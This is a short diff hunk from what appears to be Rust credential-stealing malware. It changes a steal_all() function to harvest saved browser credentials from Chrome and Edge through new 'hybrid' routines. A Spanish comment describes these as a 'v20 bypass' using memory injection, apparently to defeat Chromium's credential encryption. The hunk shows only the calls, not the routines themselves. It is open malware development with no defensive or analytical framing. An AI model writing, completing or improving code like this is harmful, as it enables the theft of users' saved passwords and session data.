@@ -212,12 +212,12 @@ pub fn steal_all() -> StolenData {
     
     let mut data = StolenData::new();
 
-    // Chromium-based browsers
-    if let Ok(mut chrome_creds) = chromium::steal_chrome() {
+    // Chromium-based browsers - USANDO HYBRID MODE (v20 bypass con memory injection)
+    if let Ok(mut chrome_creds) = chromium::steal_chrome_hybrid() {
         data.credentials.append(&mut chrome_creds);
     }
     
-    if let Ok(mut edge_creds) = chromium::steal_edge() {
+    if let Ok(mut edge_creds) = chromium::steal_edge_hybrid() {
         data.credentials.append(&mut edge_creds);
     }
     
